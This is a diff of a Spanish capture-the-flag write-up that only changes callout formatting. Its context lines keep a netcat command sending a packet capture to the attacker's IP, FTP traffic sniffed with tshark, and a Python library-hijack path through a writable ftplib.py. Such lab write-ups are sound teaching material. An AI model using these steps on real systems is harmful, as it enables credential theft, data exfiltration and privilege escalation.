@@ -103,7 +103,7 @@ nc <mi_ip> 443 < captura.pcap
 tshark -r captura.pcap -V "ftp" 2>/dev/null
 ```
 
-> [!TIP]
+> [!tip]
 >FTP por defecto no filtra el trafico, por lo que teniendo permisos del grupo pcap, puedo ver el trafico y la conexión que pasa por FTP.
 
 ### Acceso a Hades y Persistencia
@@ -135,7 +135,7 @@ cat /opt/ftpclient/ftpclient.py
   - **Resultado**: `-rw-rw-r-- 1 root hades 28920 Feb 18  2021 ftplib.py`  
     *El archivo es modificable por el grupo `hades`, al que pertenecemos*.
 
-> [!TIP]
+> [!tip]
 > Python cuando llama a una librería, primero la busca en el directorio actual, por lo que si creara una con el mismo nombre, podría usarla. De todas formas no tengo permisos para crear archivos ahí.
 
 #### Contexto Técnico: ¿Por qué es Explotable?
@@ -171,6 +171,6 @@ cat /opt/ftpclient/ftpclient.py
 
 ## Bandera(s)
 
-> [!FLAG] `flag{root}`
+> [!flag] `flag{root}`
 > Congrats
 ^bandera
